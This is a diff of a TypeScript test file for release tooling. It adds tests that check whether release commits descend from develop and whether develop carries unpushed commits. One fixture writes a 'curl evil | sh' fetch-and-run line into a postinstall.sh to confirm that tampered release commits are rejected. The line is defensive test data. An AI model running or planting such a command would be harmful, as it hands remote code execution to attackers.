@@ -8,6 +8,7 @@ import path from 'node:path';
 import { execFileSync } from 'node:child_process';
 import { repoTemplate, tempRepo } from '../../helpers.ts';
 import {
+  behindDevelop,
   compareVersions,
   draftSection,
   dropNotes,
@@ -414,6 +415,12 @@ test('releaseCommitOf accepts only a release commit npm run release made, or its
     repo.git('checkout', '-qb', 'develop');
     repo.git('commit', '-q', '--allow-empty', '-m', 'feat: work');
     const work = sha();
+    // A branch merged into develop with a merge commit: its commit is an ancestor of develop but never develop's tip.
+    repo.git('checkout', '-qb', 'side');
+    repo.git('commit', '-q', '--allow-empty', '-m', 'feat: side');
+    const side = sha();
+    repo.git('checkout', '-q', 'develop');
+    repo.git('merge', '-q', '--no-ff', '-m', 'Merge side', side);
     // The release commit `prepare` makes on `base` (a commit at 1.0.0): the bump and the notes, then `edit` on top of them.
     const releaseOn = (base: string, o: { subject?: string; to?: string; notes?: string; edit?: () => void } = {}) => {
       repo.git('checkout', '-q', '--detach', base);
@@ -438,6 +445,9 @@ test('releaseCommitOf accepts only a release commit npm run release made, or its
     const behind = releaseOn(work, { to: '1.0.9', notes: '## 1.0.9\n\n- Notes.' });
     // Right subject and version, but not develop plus the bump: another file changed next to it, or a parent develop lacks.
     const extra = releaseOn(work, { edit: () => fs.writeFileSync(path.join(repo.dir, 'postinstall.sh'), 'curl evil | sh\n') });
+    const sided = releaseOn(side);
+    // Cut from an older develop commit: still a release commit, which behindDevelop counts as behind.
+    const older = releaseOn(`${work}^`);
     repo.git('checkout', '-q', '--detach', 'main');
     repo.git('commit', '-q', '--allow-empty', '-m', 'fix: only on main');
     const foreign = releaseOn(sha());
@@ -477,6 +487,8 @@ test('releaseCommitOf accepts only a release commit npm run release made, or its
       ['not a sha', 'HEAD', '1.1.0', null],
       ['a release commit that changes another file', extra, '1.1.0', null],
       ['a release commit whose parent develop lacks', foreign, '1.1.0', null],
+      ['a release commit on a branch merged into develop', sided, '1.1.0', null],
+      ['a release commit cut from an older develop', older, '1.1.0', older],
       ['a lockfile whose resolved URL changed', lock, '1.1.0', null],
       ['a main update over that lockfile', poisoned, '1.1.0', null],
       ['a plugin.json that gained a key', plugin, '1.1.0', null],
@@ -490,10 +502,14 @@ test('releaseCommitOf accepts only a release commit npm run release made, or its
     // `develop` is the ref a release commit's parent must be on (origin/develop for a resume).
     for (const [what, tip, v, want] of rows) assert.equal(releaseCommitOf(repo.dir, tip, v, 'develop'), want, what);
     assert.equal(releaseCommitOf(repo.dir, release, '1.1.0', 'refs/remotes/origin/develop'), null, 'no origin/develop to be on');
+    // What develop has that the release lacks: the side branch and its merge, plus `work` for the older cut.
+    assert.equal(behindDevelop(repo.dir, release, 'develop'), 2);
+    assert.equal(behindDevelop(repo.dir, older, 'develop'), 3);
     repo.git('update-ref', 'refs/remotes/origin/develop', release);
     assert.equal(releaseCommitOf(repo.dir, release, '1.1.0'), release, 'origin/develop is the default');
     assert.equal(releaseCommitOf(repo.dir, update, '1.1.0'), release, 'a main update of it, by the default');
     assert.equal(releaseCommitOf(repo.dir, foreign, '1.1.0'), null, 'a parent origin/develop lacks, by the default');
+    assert.equal(behindDevelop(repo.dir, release), 0, 'origin/develop is the default');
   } finally {
     repo.cleanup();
   }
@@ -549,12 +565,29 @@ test('a landing whose push was declined is still in flight, and the next run pus
     assert.equal(out(repo, 'rev-list', '--parents', '-n', '1', merged), `${merged} ${E} ${R}`);
     assert.equal(out(repo, 'log', '-1', '--format=%s', merged), 'Release 1.1.0');
     assert.equal(out(repo, 'rev-parse', 'HEAD'), merged);
+    assert.equal(landOnDevelop(repo.dir, R, '1.1.0'), merged, 'a declined merge is pushed as it is');
 
-    // A develop with a commit origin/develop lacks that is not the landing, or one the release conflicts with, refuses.
-    repo.git('reset', '-q', '--hard', E);
-    fs.writeFileSync(path.join(repo.dir, 'README.md'), '# unpushed\n');
-    repo.git('commit', '-qam', 'feat: unpushed');
-    assert.throws(() => landOnDevelop(repo.dir, R, '1.1.0'), (e: unknown) => e instanceof Refusal && /develop differs from origin\/develop/.test(e.message));
+    // A develop with anything but the landing refuses, since the push would carry it too: a commit origin/develop
+    // lacks and no landing, a commit after the merge or under it, or one after the fast-forward.
+    const unpushed = (from: string, text: string) => {
+      repo.git('reset', '-q', '--hard', from);
+      fs.writeFileSync(path.join(repo.dir, 'README.md'), text);
+      repo.git('commit', '-qam', 'feat: unpushed');
+    };
+    const differs = (what: string) =>
+      assert.throws(() => landOnDevelop(repo.dir, R, '1.1.0'), (e: unknown) => e instanceof Refusal && /develop differs from origin\/develop/.test(e.message), what);
+    unpushed(E, '# unpushed\n');
+    differs('an unpushed commit and no landing');
+    unpushed(merged, '# after the merge\n');
+    differs('a commit after the merge');
+    unpushed(E, '# under the merge\n');
+    repo.git('merge', '-q', '--no-ff', '-m', 'Release 1.1.0', R);
+    differs('a commit under the merge');
+    repo.git('update-ref', 'refs/remotes/origin/develop', D);
+    unpushed(R, '# after the fast-forward\n');
+    differs('a commit after the fast-forward');
+
+    // One the release conflicts with refuses too, and aborts the merge.
     const E2 = moveDevelop(D, 'package.json', JSON.stringify({ name: 'forge', version: '1.0.1' }));
     assert.throws(() => landOnDevelop(repo.dir, R, '1.1.0'), (e: unknown) => e instanceof Refusal && /does not merge cleanly/.test(e.message));
     assert.equal(out(repo, 'rev-parse', 'HEAD'), E2, 'the merge was aborted');
